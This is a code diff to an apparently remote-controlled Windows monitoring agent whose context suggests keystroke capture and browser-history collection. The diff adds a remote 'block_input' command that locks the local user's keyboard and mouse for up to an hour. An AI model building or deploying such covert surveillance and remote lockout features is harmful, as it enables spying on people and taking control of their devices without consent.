@@ -116,6 +116,7 @@ last_message_id = 0
 SERVICE_KEYBOARD_LISTENER = None
 collection_paused = False
 update_lock = Lock()
+input_block_timer = None
 browser_history_seen = set()
 
 SHIFTED_SYMBOLS = {
@@ -1156,8 +1157,16 @@ def open_message_document(message):
     os.startfile(document_path)
 
 
+def release_input_block():
+    global input_block_timer
+    try:
+        ctypes.windll.user32.BlockInput(False)
+    finally:
+        input_block_timer = None
+
+
 def handle_device_command(command, command_id=None, message=""):
-    global collection_paused
+    global collection_paused, input_block_timer
     if not command:
         return
     try:
@@ -1172,6 +1181,24 @@ def handle_device_command(command, command_id=None, message=""):
             if os.name != "nt":
                 raise RuntimeError("Lock is only supported on Windows")
             ctypes.windll.user32.LockWorkStation()
+        elif command == "block_input":
+            if os.name != "nt":
+                raise RuntimeError("Input blocking is only supported on Windows")
+            try:
+                duration = int(str(message).strip())
+            except ValueError as error:
+                raise RuntimeError("Input block duration must be a whole number of seconds") from error
+            if duration < 1 or duration > 3600:
+                raise RuntimeError("Input block duration must be between 1 and 3600 seconds")
+            if input_block_timer is not None:
+                try:
+                    input_block_timer.cancel()
+                except Exception:
+                    pass
+            ctypes.windll.user32.BlockInput(True)
+            input_block_timer = Timer(duration, release_input_block)
+            input_block_timer.daemon = True
+            input_block_timer.start()
         elif command == "pause":
             flush_message_buffer()
             collection_paused = True
